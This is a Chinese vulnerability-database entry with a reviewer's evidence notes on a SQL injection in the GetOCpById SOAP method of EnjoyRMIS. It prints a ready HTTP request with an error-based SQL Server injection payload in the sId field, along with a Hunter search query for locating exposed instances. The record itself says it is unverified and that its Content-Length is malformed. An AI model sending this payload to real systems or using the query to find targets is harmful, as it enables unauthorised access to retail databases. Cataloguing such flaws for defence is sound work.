---
source: "wy876 漏洞文库"
title: "昂捷EnjoyRMIS cwsoa GetOCpById sId SQL注入"
product: "昂捷EnjoyRMIS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server类型转换报错；版本未知"
prerequisites: "无Cookie请求，鉴权未证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cz8ou2w7wpwho4p8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%98%82%E6%8D%B7/EnjoyRMISGetOCpById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"CheckSilverlightInstalled\""
id: "vw-504a6bc632ba96b3c4fd473c"
entity_id: "ve-504a6bc632ba96b3c4fd473c"
schema_version: "1"
---

# 昂捷EnjoyRMIS cwsoa GetOCpById sId SQL注入

## 条目说明

- 对象与具体问题：昂捷EnjoyRMIS；cwsoa GetOCpById sId SQL注入
- 版本、配置及部署条件：SQL Server类型转换报错；版本未知
- 认证与权限前提：无Cookie请求，鉴权未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- GetOCpById在SOAPAction与XML方法名一致，sId为实际输入，基准和探针均已读；同服务其他方法不能只按模板去重
- Content-Length字面length非法；普通string及报错表达式均无实际响应，只有sqlmap标签不证明验证
- 服务器控制是额外数据库权限/配置条件，不是此报错探针已证能力
- 建议合并产品介绍与通用测试说明，保留方法-参数-权限-版本-返回证据矩阵；缺补丁/源代码

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
EnjoyRMIS GetOCpById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

## 二、影响版本
+ EnjoyRMIS

## 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


## 四、漏洞复现
```http
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCpById xmlns="http://tempuri.org/">
      <sId>string' AND 9068 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9068=9068) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(107)+CHAR(113))) AND 'kNzW'='kNzW</sId>
    </GetOCpById>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


sqlmap

```http
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCpById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCpById>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cz8ou2w7wpwho4p8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
